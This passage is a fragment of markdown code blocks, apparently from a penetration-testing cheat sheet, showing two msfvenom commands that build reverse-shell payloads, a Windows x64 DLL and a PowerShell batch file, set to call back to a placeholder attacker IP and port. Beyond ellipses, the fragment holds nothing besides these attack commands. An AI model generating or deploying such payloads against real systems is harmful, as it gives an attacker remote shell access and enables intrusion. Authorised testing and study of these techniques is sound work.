...
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f dll > shell.dll
```
```bash
...
```
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=<attacker-ip> lport=<port> > shell.bat
```
